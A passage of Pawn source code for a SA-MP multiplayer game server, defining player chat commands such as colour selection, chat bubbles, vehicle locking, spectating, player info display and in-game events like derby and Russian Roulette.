		    if (player[ ccplayerlist[ccPlayer] ][playingcc] == 1 && ccplayerlist[ccPlayer] != playerid)
			{
				if (IsPlayerInRangeOfPoint(ccplayerlist[ccPlayer], 10.0, criminalxyz[0], criminalxyz[1], criminalxyz[2]))
				{
					GetPlayerName(playerid, playername, sizeof(playername));
					format(strings, sizeof(strings), "%s left the cop chase. (Surrendering)", playername);
					SendServerMessageToAll(EMBED_ORANGE, strings);
					format(strings, sizeof(strings), "2 %s left the cop chase. (Surrendering)", playername);
					IRC_GroupSay(1, IRC_CHANNEL, strings);
					SetTimerEx("RemoveCCPlayerEx", 3000, 0, "i", playerid);
					TogglePlayerControllable(playerid, 0);
					break;
				}
			}
		}
		SetPlayerColor(playerid, COLOR_RED);
	}

	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
	return 1;
}

dcmd_stop(playerid,params[])
{
	#pragma unused params
	
	ClearAnimations(playerid);
	return 1;
}

dcmd_stopanim(playerid,params[])
{
	#pragma unused params

	ApplyAnimation(playerid, "PED", "facsurpm", 4.1,0,1,1,0,1);
	return 1;
}

dcmd_stopani(playerid,params[])
{
	#pragma unused params

	ApplyAnimation(playerid, "PED", "facsurpm", 4.1,0,1,1,0,1);
	return 1;
}

dcmd_colour(playerid,params[])
return dcmd_color(playerid,params);

dcmd_color(playerid,params[])
{
	new color[15];

	if (sscanf(params, "s[15] ", color))
	{
		new colorStr[1052];

		colorStr =			""EMBED_WHITE"Random\n\
							WHITE\n\
							WHITE (Invisible)\n\
							"EMBED_GREEN"GREEN\n\
							"EMBED_RED"RED\n\
							"EMBED_BLUE"BLUE\n\
							"EMBED_PINK"PINK\n\
							"EMBED_PURPLE"PURPLE\n\
							"EMBED_YELLOW"YELLOW\n\
							"EMBED_BROWN"BROWN\n\
							"EMBED_GREY"GREY\n\
							"EMBED_GREY"BLACK\n\
							"EMBED_LPINK"LPINK\n\
							"EMBED_ORANGE"ORANGE\n\
							"EMBED_PINKRED"PINKRED\n\
							"EMBED_DARKRED"DARKRED\n\
							"EMBED_DARKERRED"DARKERRED\n\
							"EMBED_ORANGERED"ORANGERED\n\
							"EMBED_TOMATO"TOMATO\n\
							"EMBED_LIGHTBLUE"LIGHTBLUE\n\
							"EMBED_LIGHTNAVY"LIGHTNAVY\n";

		strcat(colorStr, 	""EMBED_NAVYBLUE"NAVYBLUE\n\
							"EMBED_LBLUE"LBLUE\n\
							"EMBED_LLBLUE"LLBLUE\n\
							"EMBED_FLBLUE"FLBLUE\n\
							"EMBED_BLUEVIOLET"BLUEVIOLET\n\
							"EMBED_BISQUE"BISQUE\n\
							"EMBED_LIME"LIME\n\
							"EMBED_LAWNGREEN"LAWNGREEN\n\
							"EMBED_SEAGREEN"SEAGREEN\n\
							"EMBED_LIMEGREEN"LIMEGREEN\n\
							"EMBED_SPRINGGREEN"SPRINGGREEN\n\
							"EMBED_YELLOWGREEN"YELLOWGREEN\n\
							"EMBED_GREENYELLOW"GREENYELLOW\n\
							"EMBED_OLIVE"OLIVE\n\
							"EMBED_AQUA"AQUA\n\
							"EMBED_MEDIUMAQUA"MEDIUMAQUA\n\
							"EMBED_MAGENTA"MAGENTA\n");

		strcat(colorStr, 	""EMBED_MEDIUMMAGENTA"MEDIUMMAGENTA\n\
							"EMBED_CHARTREUSE"CHARTREUSE\n\
							"EMBED_CORAL"CORAL\n\
							"EMBED_GOLD"GOLD\n\
							"EMBED_INDIGO"INDIGO\n\
							"EMBED_IVORY"IVORY");

		ShowPlayerDialog(playerid, DIALOGID_COLOUR, DIALOG_STYLE_LIST, "Available colours", colorStr, "Set", "Cancel");
	} else {
		if (!strcmp(color, "random",true))				SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
		else if (!strcmp(color, "white",true))			SetPlayerColor(playerid, COLOR_WHITE);
		else if (!strcmp(color, "trans",true))			SetPlayerColor(playerid, COLOR_INVISIBLE);
		else if (!strcmp(color, "green",true))			SetPlayerColor(playerid, COLOR_GREEN);
		else if (!strcmp(color, "red",true))			SetPlayerColor(playerid, COLOR_RED);
		else if (!strcmp(color, "blue",true))			SetPlayerColor(playerid, COLOR_BLUE);
		else if (!strcmp(color, "pink",true))			SetPlayerColor(playerid, COLOR_PINK);
		else if (!strcmp(color, "purple",true))			SetPlayerColor(playerid, COLOR_PURPLE);
		else if (!strcmp(color, "yellow",true))			SetPlayerColor(playerid, COLOR_YELLOW);
		else if (!strcmp(color, "brown",true))			SetPlayerColor(playerid, COLOR_BROWN);
		else if (!strcmp(color, "grey",true))			SetPlayerColor(playerid, COLOR_GREY);
		else if (!strcmp(color, "black",true))			SetPlayerColor(playerid, COLOR_BLACK);
		else if (!strcmp(color, "lpink",true))			SetPlayerColor(playerid, COLOR_LPINK);
		else if (!strcmp(color, "orange",true))			SetPlayerColor(playerid, COLOR_ORANGE);
		else if (!strcmp(color, "pinkred",true))		SetPlayerColor(playerid, COLOR_PINKRED);
		else if (!strcmp(color, "darkred",true))		SetPlayerColor(playerid, COLOR_DARKRED);
		else if (!strcmp(color, "darkerred",true))		SetPlayerColor(playerid, COLOR_DARKERRED);
		else if (!strcmp(color, "orangered",true))		SetPlayerColor(playerid, COLOR_ORANGERED);
		else if (!strcmp(color, "tomato",true))			SetPlayerColor(playerid, COLOR_TOMATO);
		else if (!strcmp(color, "lightblue",true))		SetPlayerColor(playerid, COLOR_LIGHTBLUE);
		else if (!strcmp(color, "lightnavy",true))		SetPlayerColor(playerid, COLOR_LIGHTNAVY);
		else if (!strcmp(color, "navyblue",true))		SetPlayerColor(playerid, COLOR_NAVYBLUE);
		else if (!strcmp(color, "lblue",true))			SetPlayerColor(playerid, COLOR_LBLUE);
		else if (!strcmp(color, "llblue",true))			SetPlayerColor(playerid, COLOR_LLBLUE);
		else if (!strcmp(color, "flblue",true))			SetPlayerColor(playerid, COLOR_FLBLUE);
		else if (!strcmp(color, "blueviolet",true))		SetPlayerColor(playerid, COLOR_BLUEVIOLET);
		else if (!strcmp(color, "bisque",true))			SetPlayerColor(playerid, COLOR_BISQUE);
		else if (!strcmp(color, "lime",true))			SetPlayerColor(playerid, COLOR_LIME);
		else if (!strcmp(color, "lawngreen",true))		SetPlayerColor(playerid, COLOR_LAWNGREEN);
		else if (!strcmp(color, "seagreen",true))		SetPlayerColor(playerid, COLOR_SEAGREEN);
		else if (!strcmp(color, "limegreen",true))		SetPlayerColor(playerid, COLOR_LIMEGREEN);
		else if (!strcmp(color, "springgreen",true))	SetPlayerColor(playerid, COLOR_SPRINGGREEN);
		else if (!strcmp(color, "yellowgreen",true))	SetPlayerColor(playerid, COLOR_YELLOWGREEN);
		else if (!strcmp(color, "greenyellow",true))	SetPlayerColor(playerid, COLOR_GREENYELLOW);
		else if (!strcmp(color, "olive",true))			SetPlayerColor(playerid, COLOR_OLIVE);
		else if (!strcmp(color, "aqua",true))			SetPlayerColor(playerid, COLOR_AQUA);
		else if (!strcmp(color, "mediumaque",true))		SetPlayerColor(playerid, COLOR_MEDIUMAQUA);
		else if (!strcmp(color, "magenta",true))		SetPlayerColor(playerid, COLOR_MAGENTA);
		else if (!strcmp(color, "mediummagenta",true))	SetPlayerColor(playerid, COLOR_MEDIUMMAGENTA);
		else if (!strcmp(color, "chartreuse",true))		SetPlayerColor(playerid, COLOR_CHARTREUSE);
		else if (!strcmp(color, "coral",true))			SetPlayerColor(playerid, COLOR_CORAL);
		else if (!strcmp(color, "gold",true))			SetPlayerColor(playerid, COLOR_GOLD);
		else if (!strcmp(color, "indigo",true))			SetPlayerColor(playerid, COLOR_INDIGO);
		else if (!strcmp(color, "ivory",true))			SetPlayerColor(playerid, COLOR_IVORY);
		else SendErrorMessage(playerid, EMBED_WHITE, "Type /colour to open a list of predefined colours OR type /colour <colour> for instant effect (see list).");
	}
	return 1;
}

dcmd_remove(playerid,params[])
{
	#pragma unused params

	ResetPlayerWeapons(playerid);
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Weapons reset.");
	return 1;
}

dcmd_me(playerid,params[])
{
	if (mutedchat == true && !IsAdmin(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	if (strlen(params) < 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /me <action>");

	if (!IsAdmin(playerid))
	SpamProtection(playerid, "/me");

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "*** %s %s", playername, params);
	SendClientMessageToAll(COLOR_PINK, strings);
	format(tmps2, sizeof(tmps2), "13%s", strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	return 1;
}

dcmd_bubble(playerid,params[])
return dcmd_bu(playerid,params);

dcmd_bu(playerid,params[])
{
	if (mutedchat == true && !IsAdmin(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	new color[6],
	    message[122],
		customcolor;

	if (!sscanf(params, "s[128]", tmps2))
	{
		if (!sscanf(tmps2, "s[6] s[122]", color, message))
		{
			if (!strcmp(color, "grey",true))			customcolor = 0xAFAFAFAA;
			else if (!strcmp(color, "green",true))	customcolor = COLOR_GREEN;
			else if (!strcmp(color, "red",true))		customcolor = 0xFF0000AA;
			else if (!strcmp(color, "yellow",true))	customcolor = 0xFFFF00AA;
			else if (!strcmp(color, "white",true)) 	customcolor = 0xFFFFFFAA;
			else if (!strcmp(color, "blue",true))  	customcolor = 0x0000BBAA;
			else if (!strcmp(color, "lblue",true)) 	customcolor = 0x00FFFFAA;
			else if (!strcmp(color, "orange",true))	customcolor = 0xFF9900AA;
			else if (!strcmp(color, "black",true)) 	customcolor = 0x000000AA;
			else if (!strcmp(color, "pink",true))  	customcolor = COLOR_PINK;
			else if (!strcmp(color, "lime",true))  	customcolor = COLOR_LIME;
			else if (!strcmp(color, "gold",true))  	customcolor = COLOR_GOLD;
			else if (!strcmp(color, "brown",true)) 	customcolor = COLOR_BROWN;
			else if (!strcmp(color, "random",true))	customcolor = PlayerColors[random(sizeof(PlayerColors))];
			else {
				SetPlayerChatBubble(playerid, tmps2, COLOR_PINK, 100.0, 30000);
				GetPlayerName(playerid, playername, sizeof(playername));
				format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, tmps2);
				IRC_GroupSay(1, IRC_CHANNEL, tmps2);
				return 1;
			}

			SetPlayerChatBubble(playerid, message, customcolor, 100.0, 30000);
			GetPlayerName(playerid, playername, sizeof(playername));
			format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, message);
			IRC_GroupSay(1, IRC_CHANNEL, tmps2);
		} else {
			SetPlayerChatBubble(playerid, tmps2, COLOR_PINK, 100.0, 30000);
			GetPlayerName(playerid, playername, sizeof(playername));
			format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, tmps2);
			IRC_GroupSay(1, IRC_CHANNEL, tmps2);
		}
	} else {
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bu(bble) (<colour>) <message>");
		SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
	}
	return 1;
}

dcmd_f(playerid,params[])
{
	#pragma unused params

	TogglePlayerControllable(playerid, 0);
	return 1;
}

dcmd_uf(playerid,params[])
{
	#pragma unused params

	if (player[playerid][frozen] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot unfreeze because you got frozen by an admin");

	TogglePlayerControllable(playerid, 1);
	return 1;
}

dcmd_flip(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 1)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid);
	GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
	SetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2] + 2.5);
	GetVehicleZAngle(vID, playerxyza[3]);
	SetVehicleZAngle(vID, playerxyza[3]);
	return 1;
}

dcmd_kill(playerid,params[])
{
	#pragma unused params

	if (player[playerid][frozen] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot kill yourself because you got frozen by an admin");

	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicleEx(playerid);

	player[playerid][suicide] = 1;
	SetPlayerArmour(playerid, 0.0);
	SetPlayerHealth(playerid, 0.0);
	return 1;
}

dcmd_l(playerid,params[])
return dcmd_lock(playerid,params);

dcmd_lock(playerid,params[])
{ // Joshua Yu
	#pragma unused params

	if (player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "Not allowed in Warzone.");

	if (!IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You need to be in a vehicle");

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You can only lock the doors as driver.");

	if (vehicle[GetPlayerVehicleID(playerid)][Locked])
	return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle is already locked!");

	new vID = GetPlayerVehicleID(playerid);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (i != playerid)
		{
			SetVehicleParamsForPlayerEx(vID, i, vehicle[vID][Objective], 1);

			if (GetPlayerVehicleID(i) == vID)
			SendClientMessage(i,COLOR_YELLOW, "The driver has locked the vehicle that you're in.");
		}
	}
	vehicle[vID][Owner] = playerid;
	SetVehicleParamsForPlayer(vID, playerid, vehicle[vID][Objective], 0);
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle locked!");
	return 1;
}

dcmd_ul(playerid,params[])
return dcmd_unlock(playerid,params);

dcmd_unlock(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You need to be in a vehicle");

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You can only unlock the doors as driver.");

	if (!vehicle[GetPlayerVehicleID(playerid)][Locked])
	return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle is already unlocked!");

	new vID = GetPlayerVehicleID(playerid);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		SetVehicleParamsForPlayerEx(vID,i, vehicle[vID][Objective], 0);

		if (GetPlayerVehicleID(i) == vID && i != playerid)
		SendClientMessage(i,COLOR_YELLOW, "The driver has unlocked the vehicle that you're in.");
	}
	vehicle[vID][Owner] = -1;
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle unlocked!");
	return 1;
}

dcmd_gi(playerid, params[])
return dcmd_getinfo(playerid, params);

dcmd_getinfo(playerid, params[])
{
	if (player[playerid][PMSGtextdraw] != -1)
	{
		TextDrawHideForPlayer(playerid, pmsg1[playerid]);
		TextDrawHideForPlayer(playerid, pmsg2[playerid]);
		TextDrawHideForPlayer(playerid, pmsg3[playerid]);
		TextDrawHideForPlayer(playerid, pmsg4[playerid]);
		TextDrawHideForPlayer(playerid, pmsg5[playerid]);
		player[playerid][SpectatingInfo] = -1;
		player[playerid][PMSGtextdraw] = -1;
		return 1;
	}

    if (!strlen(params))
    return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gi(getinfo) <name|id>   [Disable: /gi]");

   	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
	    new Float:Armor,
			Float:pHealth,
			god[4],
			vgod[4];

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerHealth(giveplayerid, pHealth);
		GetPlayerArmour(giveplayerid, Armor);

		if (player[giveplayerid][godmode] == 1) god = "On";
		else god = "Off";

		if (player[giveplayerid][vgodmode] == 1) vgod = "On";
		else vgod = "Off";

		if (IsAdmin(playerid))
		{
		    new spect[15],
				location[25] = "Unknown";

			GetPlayer2DZone(giveplayerid, location, sizeof(location));
			GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
			GetPlayerFacingAngle(giveplayerid, playerxyza[3]);

			GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
			if (player[giveplayerid][Spectating] == 1) format(spect, sizeof(spect), "Yes (ID: %d)", player[giveplayerid][SpectatingOn]);
			else spect = "No";

			if (player[playerid][ADMIN] >= player[giveplayerid][ADMIN])
			{
				TextDrawSetString(pmsg2[playerid], "\
				~b~Player info~n~~n~~r~\
				Name:~n~\
				Spectating:~n~\
				God / VGod:~n~\
				Health:~n~\
				Armour:~n~\
				Location:~n~\
				World:~n~\
				XYZA:~n~\
				IP:~n~\
				Playtime:\
				");

				format(infostr, sizeof(infostr), "\
				~n~~n~~w~\
				%s ~y~(id: %d | ping: %d)~n~\
				%s~n~\
				%s / %s~n~\
				%0.2f~n~\
				%0.2f\
				", giveplayername, giveplayerid, GetPlayerPing(giveplayerid), spect, god, vgod, pHealth, Armor);
				TextDrawSetString(pmsg3[playerid], infostr);

				format(infostr, sizeof(infostr), "\
				%s~n~\
				%d~n~\
				%0.2f %0.2f %0.2f %0.2f~n~\
				%s~n~\
				%d minutes\
				", location, GetPlayerVirtualWorld(giveplayerid), playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], playerip, player[giveplayerid][playtime]/60);
				TextDrawSetString(pmsg4[playerid], infostr);
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~b~Player info~n~~n~~r~\
				Name:~n~\
				God / VGod:~n~\
				Health:~n~\
				Armour:~n~\
				Location:~n~\
				XYZA:~n~\
				IP:~n~\
				Playtime:~n~\
				~n~\
				\
				");

				format(infostr, sizeof(infostr), "\
				~n~~n~~w~\
				%s ~y~(id: %d | ping: %d)~n~\
				%s / %s~n~\
				%0.2f~n~\
				%0.2f~n~\
				%s\
				", giveplayername, giveplayerid, GetPlayerPing(giveplayerid), god, vgod, pHealth, Armor, location);
				TextDrawSetString(pmsg3[playerid], infostr);

				format(infostr, sizeof(infostr), "\
				%0.2f %0.2f %0.2f %0.2f~n~\
				%s~n~\
				%d minutes~n~\
				~n~\
				\
				", playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], playerip, player[giveplayerid][playtime]/60);
				TextDrawSetString(pmsg4[playerid], infostr);
			}
    	} else {
			if (playerid != giveplayerid)
			{
				TextDrawSetString(pmsg2[playerid], "\
				~b~Player info~n~~n~~r~\
				Name:~n~\
				God / VGod:~n~\
				Health:~n~\
				Armour:~n~\
				Playtime:~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				format(infostr, sizeof(infostr), "\
				~n~~n~~w~\
				%s ~y~(id: %d | ping: %d)~n~\
				%s / %s~n~\
				%0.2f~n~\
				%0.2f~n~\
				%d minutes\
				", giveplayername, giveplayerid, GetPlayerPing(giveplayerid), god, vgod, pHealth, Armor, player[giveplayerid][playtime]/60);
				TextDrawSetString(pmsg3[playerid], infostr);

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			} else { // own getinfo check
			    new location[25] = "Unknown";

				GetPlayer2DZone(playerid, location, sizeof(location));
				GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);

				TextDrawSetString(pmsg2[playerid], "\
				~b~Player info~n~~n~~r~\
				Name:~n~\
				God / VGod:~n~\
				Health:~n~\
				Armour:~n~\
				Location:~n~\
				World:~n~\
				XYZA:~n~\
				Playtime:~n~\
				~n~\
				\
				");

				format(infostr, sizeof(infostr), "\
				~n~~n~~w~\
				%s ~y~(id: %d | ping: %d)~n~\
				%s / %s~n~\
				%0.2f~n~\
				%0.2f~n~\
				%s\
				", giveplayername, giveplayerid, GetPlayerPing(giveplayerid), god, vgod, pHealth, Armor, location);
				TextDrawSetString(pmsg3[playerid], infostr);

				format(infostr, sizeof(infostr), "\
				%d~n~\
				%0.2f %0.2f %0.2f %0.2f~n~\
				%d minutes~n~\
				~n~\
				\
				", GetPlayerVirtualWorld(giveplayerid), playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], player[giveplayerid][playtime]/60);
				TextDrawSetString(pmsg4[playerid], infostr);
			}
		}
		TextDrawHideForPlayer(playerid, pmsg1[playerid]); // don't need this for td
		TextDrawShowForPlayer(playerid, pmsg2[playerid]);
		TextDrawShowForPlayer(playerid, pmsg3[playerid]);
		TextDrawShowForPlayer(playerid, pmsg4[playerid]);
		TextDrawHideForPlayer(playerid, pmsg5[playerid]); // don't need this for td
		if (IsAdmin(playerid)) player[playerid][SpectatingInfo] = giveplayerid; // only auto update info td for admins
		player[playerid][PMSGtextdraw] = TD_MODE_GETINFO;
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected");
  	return 1;
}

dcmd_spec(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid,COLOR_WHITE, "[USAGE]: /spec <name|id /OFF>");

	if (!strcmp(params, "off", true))
	{
		if (player[playerid][Spectating] == 1)
		{
			player[playerid][Spectating] = 0;
			player[playerid][SpectatingOn] = -1;
		    TogglePlayerSpectating(playerid, false);
			SpawnPlayer(playerid);
		} else SendErrorMessage(playerid, EMBED_WHITE, "You must be spectating someone!");
		return 1;
	}

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

	if (giveplayerid == playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You can't spectate yourself!");

	if (!IsPlayerSpawned(giveplayerid) || IsPlayerNPC(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (!IsAdmin(playerid) && IsAdmin(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating"); // false

	if (player[giveplayerid][specdm] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating a dm");

	if (player[giveplayerid][Spectating] == 1 || GetPlayerState(giveplayerid) == PLAYER_STATE_SPECTATING)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating");

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
		if (pSObject[playerid][i][so_object] != -1)
		{
			DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
		RemovePlayerAttachedObject(playerid, pi);
	}

	player[playerid][Spectating] = 1;
	player[playerid][SpectatingOn] = giveplayerid;
	
	TogglePlayerSpectating(playerid, true);
	SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));

	if (IsAdmin(playerid))
	{
		if (player[playerid][ADMIN] >= player[giveplayerid][ADMIN])
		{
		    new worldid = GetPlayerVirtualWorld(giveplayerid);
		    if (GetPlayerVirtualWorld(playerid) != worldid)
		    {
				SetPlayerVirtualWorld(playerid, worldid);
				format(strings, sizeof(strings), "[INFO]: World changed to spectate this person: %d", worldid);
				SendClientMessage(playerid, COLOR_IVORY, strings);
			}
		}
	} else {
		if (player[giveplayerid][playingdm] == 1 || player[giveplayerid][playingrr] == 1) SetPlayerVirtualWorld(playerid, WORLDID_DM);
		else if (player[giveplayerid][playingderby] == 1) SetPlayerVirtualWorld(playerid, WORLDID_DERBY);
		else if (player[giveplayerid][playingcc] == 1)
		{
		    if (IsVIP(playerid)) SetPlayerVirtualWorld(playerid, WORLDID_COPCHASE);
		    else SendClientMessage(playerid, COLOR_IVORY, "[INFO]: This player is in an event that does not allow spectating.");
		}
		else if (player[giveplayerid][playingnb] == 1) SetPlayerVirtualWorld(playerid, WORLDID_NADEBALL);
		else if (player[giveplayerid][playingwarzone] == 1)
		{
		    if (IsVIP(playerid)) SetPlayerVirtualWorld(playerid, WORLDID_WARZONE);
		    else SendClientMessage(playerid, COLOR_IVORY, "[INFO]: This player is in an event that does not allow spectating.");
		}
	}

	if (IsPlayerInAnyVehicle(giveplayerid))
	PlayerSpectateVehicle(playerid, GetPlayerVehicleID(giveplayerid));
	else PlayerSpectatePlayer(playerid, giveplayerid);

	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Use /spec off to stop spectating");
	
	if (!IsAdmin(giveplayerid))
	{
		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "%s is now spectating on %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAdmins(EMBED_BROWN, strings, 1);
	}
	return 1;
}

dcmd_jaillist(playerid,params[])
{
	#pragma unused params

 	new jailinmates;

  	for (new i = 0; i < MAX_PLAYERS; i++)
  	{
		if (IsPlayerConnected(i) && player[i][jailed] == 1)
		{
		    if (jailinmates == 0)
			{
	      		SendClientMessage(playerid, COLOR_IVORY, "* List of players currently in jail:");
				jailinmates = 1;
			}
			GetPlayerName(i, playername, sizeof(playername));
			format(strings, sizeof(strings), "* %s (id: %d)", playername, i);
			SendClientMessage(playerid, COLOR_IVORY, strings);
		}
	}
	if (jailinmates == 0)
	SendClientMessage(playerid, COLOR_IVORY, "* The jail is empty apart from some hamsters.");
	return 1;
}

dcmd_rr(playerid,params[])
{
	#pragma unused params

	if (blockevents == true || rrlocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");

	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	if (rrplayers == MAX_RR_PLAYERS)
	return SendErrorMessage(playerid, EMBED_WHITE, "Russian Roulette is full, please wait till it ends!");

	if (!rrstarted)
	{
		if (!AntiSpam(playerid, 5)) return 1;
		
		ResetSelectMode(playerid);
		AddRRPlayer(playerid);
	} else SendErrorMessage(playerid, EMBED_WHITE, "Russian Roulette has already started.");
	return 1;
}

dcmd_spin(playerid,params[])
{
	#pragma unused params

	if (!rrstarted)
	return SendErrorMessage(playerid, EMBED_WHITE, "Russian Roulette is not started.");

	if (player[playerid][playingrr] == 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are not in Russian Roulette.");

	if (currentrruser != playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are not holding the gun!");

	if (isgunspun == true)
	return SendErrorMessage(playerid, EMBED_WHITE, "Your weapon is ready to fire, wait till it's reloaded. (/fire)");

	SetRRPhase(2);
	rrsecondslefttillnext = 30;
	return 1;
}

dcmd_fire(playerid,params[])
{
	#pragma unused params

	if (!rrstarted)
	return SendErrorMessage(playerid, EMBED_WHITE, "Russian Roulette is not started.");

	if (player[playerid][playingrr] == 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are not in Russian Roulette.");

	if (currentrruser != playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are not holding the gun!");

	if (isgunspun == false)
	return SendErrorMessage(playerid, EMBED_WHITE, "You must spin the cylinder first! (/spin)");

	if (isgunspundone == false)
	return SendErrorMessage(playerid, EMBED_WHITE, "You must wait till the cylinder stops spinning");

	SetRRPhase(4);
	rrsecondslefttillnext = 30;
	return 1;
}

dcmd_derby(playerid,params[])
{
	if (blockevents == true || derbylocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");

	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	if (derbyplayers == DerbyMaxPlayers)
	return SendErrorMessage(playerid, EMBED_WHITE, "Derby is full, please wait till it ends!");

	if (!derbystarted)
	{
		if (!AntiSpam(playerid, 5)) return 1;

		TogglePlayerControllable(playerid, 1);
		if (derbyplayers == 0)
		{
	    	new idx;

			tmps2 = strtok(params, idx);
			if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
		 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /derby <DerbyID[1-100]> (see /derbylist)");

			new derbyidstr[20];
			format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
			if (!djIsSet(DERBYFILE, derbyidstr))
			return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
			DerbyID = strval(tmps2);

			format(derbystr, sizeof(derbystr), "D%d/Mode", DerbyID);
			if (!djIsSet(DERBYFILE, derbystr))
			{
				format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
			    format(strings, sizeof(strings), "No mode is set for derby \"%s\" (DerbyID %d) [/setdmode]", dj(DERBYFILE, derbystr), DerbyID);
				SendErrorMessage(playerid, EMBED_WHITE, strings);
				return 1;
			}
			DerbyMode = djInt(DERBYFILE, derbystr);

			format(derbystr, sizeof(derbystr), "D%d/Center/X", DerbyID); // only perform check once because X Y Z belong together
			if (!djIsSet(DERBYFILE, derbystr))
			{
				format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
			    format(strings, sizeof(strings), "No centerXYZ is set for derby \"%s\" (DerbyID %d) [/setdcenter]", dj(DERBYFILE, derbystr), DerbyID);
				SendErrorMessage(playerid, EMBED_WHITE, strings);
				return 1;
			}
